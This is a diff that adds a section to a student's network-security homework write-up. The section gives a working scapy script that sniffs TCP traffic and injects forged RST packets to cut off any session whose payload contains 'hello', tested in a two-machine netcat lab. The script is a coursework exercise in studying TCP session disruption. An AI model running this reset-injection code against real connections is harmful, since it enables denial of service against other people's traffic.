@@ -1123,3 +1123,65 @@ event ssl_client_hello(c: connection, version: count,
 ```
 
 Due to time limitation, this is what I've done right now. I'll upload a revised updated version of this homework if possible.
+
+
+
+### Optional #7
+
+The question asked us to write a program to identify TCP connection by specific predefined strings. After target connection detected, disrupt the TCP session. 
+
+I used `scapy` to solve this problem. Code like this:
+
+```Python
+from scapy.all import *
+import sys
+
+filtre = "host " + sys.argv[1] + " and port " + sys.argv[2]
+
+def resetHijack(p):
+	print "TCP:"
+	print "."	#to mark 1 time tcp packet
+	print str(p[IP].src) + ':' + str(p[TCP].sport) + '->' + str(p[IP].dst) + ':' + str(p[TCP].dport)
+	print "payload: " + str(p[TCP].payload)
+	ether = Ether(dst=p[Ether].src, src=p[Ether].dst)
+	ip = IP(src=p[IP].dst, dst=p[IP].src, ihl=p[IP].ihl, flags=p[IP].flags, frag=p[IP].frag, proto=p[IP].proto, id=29321)
+	
+	#flag RST	
+	tcp = TCP(sport=p[TCP].dport, dport=p[TCP].sport, seq=p[TCP].ack, ack=p[TCP].seq, dataofs=p[TCP].dataofs, reserved=p[TCP].reserved, flags="R", window=p[TCP].window, options=p[TCP].options)
+	
+	reset=ether/ip/tcp
+	
+	if 'hello' in str(p[TCP].payload):
+		print "Cut off TCP connection!"
+		sendp(reset)
+		sys.exit()
+
+sniff(count=0, prn = lambda p : resetHijack(p),filter=filtre,lfilter=lambda(f): f.haslayer(IP) and f.haslayer(TCP))
+```
+
+In this tiny program, I chose string `hello` as the identifier of our TCP session. The basic setup of this experiment is:
+
+| Machine | OS         | IP Address    | Command                 |
+| ------- | ---------- | ------------- | ----------------------- |
+| Server  | Kali VM    | 172.16.32.136 | `nc -lvp 9999`          |
+| Client  | macOS Host | 172.16.32.1   | `nc 172.16.32.136 9999` |
+
+![](http://ww1.sinaimg.cn/large/006y8mN6gw1f9da02reblj30bs08jdg3.jpg)
+
+![](http://ww2.sinaimg.cn/large/006y8mN6gw1f9da0b9remj31kw0pltd8.jpg)
+
+As we can see, to start a tcp connection it contains 3 times handshake.
+
+![](http://ww1.sinaimg.cn/large/006y8mN6gw1f9da1gjdbnj30bs08j0t0.jpg)
+
+![](http://ww1.sinaimg.cn/large/006y8mN6gw1f9da1tjcjyj31kw0pbgq2.jpg)
+
+If we send a non-identified string, the tcp session would not be disrupted.
+
+![](http://ww4.sinaimg.cn/large/006y8mN6gw1f9da36r2qgj30bs08jt92.jpg)
+
+![](http://ww4.sinaimg.cn/large/006y8mN6gw1f9da3h4wdaj31kw0pmdky.jpg)
+
+If the tcp payload contains our predefined string, which is `hello`. The tcp connection would be cut off.
+
+See the dump file in q7.pcap
